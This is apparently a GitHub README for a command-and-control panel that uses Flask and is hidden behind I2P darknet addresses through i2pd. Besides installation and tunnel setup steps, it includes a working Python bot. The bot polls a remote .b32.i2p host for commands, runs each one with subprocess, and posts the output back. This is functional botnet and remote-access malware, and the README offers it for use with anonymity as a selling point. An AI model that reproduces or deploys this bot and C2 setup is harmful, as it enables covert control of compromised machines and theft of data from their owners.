# 🕵️‍♂️ I2P Command & Control Panel

A fancy, lightweight, and anonymous Command & Control (C2) panel built using Flask, Bootstrap 5, and SQLite — accessible via the I2P darknet using `i2pd`.

---

## ✅ Features

- ✨ Modern Bootstrap 5 UI with animations (Animate.css)
- 🧠 SQLite-based command and response tracking
- 🔐 Full C2 communication over I2P `.b32.i2p` addresses
- 🕸️ Remote command dispatch and bot response capture
- 🛡️ Input sanitization using `bleach` for security
- 📱 Responsive and mobile-friendly design

---

## ✅ 1. Installation

### Requirements

- Python 3.8+
- Flask
- SQLite3
- `i2pd` (I2P router daemon)
- `bleach` (for secure input filtering)

### Install dependencies:

```bash
pip install flask bleach
````

---

## ✅ 2. Running the Panel

Clone and run:

```bash
git clone https://github.com/yourname/i2p-c2-panel.git
cd i2p-c2-panel
python3 app.py
```

Your panel will now be accessible locally at:

```
http://127.0.0.1:8080
```

---

## ✅ 3. I2P Tunnel Setup

### Option A: Using `i2pd` (Fastest and Headless)

#### Install i2pd (Debian/Ubuntu):

```bash
sudo apt install i2pd
```

#### Edit `~/.i2pd/tunnels.conf`:

```ini
[c2_panel]
type = http
address = 127.0.0.1
port = 8080
inport = 80
keys = c2.dat
```

#### Start the daemon:

```bash
sudo systemctl start i2pd
```

#### Check your I2P hostname:

```bash
cat ~/.i2pd/c2.dat.b32.i2p
```

You can now access the panel via:

```
http://[c2name].b32.i2p
```

> 📌 Note: Use an I2P-enabled browser or proxy to access `.b32.i2p` addresses.

---

## ✅ 4. Bot Communication Example

Here's an example Python bot that polls the C2 for commands and reports results:

```python
import time, requests, subprocess

C2 = "http://[your-c2-name].b32.i2p"
NAME = "test-bot"

while True:
    try:
        cmd = requests.get(f"{C2}/get_command").text
        if cmd:
            out = subprocess.getoutput(cmd)
            requests.post(f"{C2}/submit_output", data={"name": NAME, "output": out})
        time.sleep(30)
    except:
        time.sleep(60)
```

🛡️ Ensure the bot can resolve `.b32.i2p` addresses through an I2P proxy or local tunnel.

---

## ✅ 5. Directory Structure

```
i2p-c2-panel/
├── app.py
├── c2.db               # Auto-created on first run
└── templates/
    └── index.html      # Bootstrap 5 + Animate.css UI
```

---

## ✅ 6. Summary

| Component   | Purpose                          |
| ----------- | -------------------------------- |
| Flask       | Backend server and web interface |
| Bootstrap 5 | Fancy responsive UI              |
| Animate.css | Smooth UI animations             |
| SQLite      | Store commands and outputs       |
| bleach      | Secure input sanitization        |
| I2P / i2pd  | Anonymous access via `.b32.i2p`  |

---
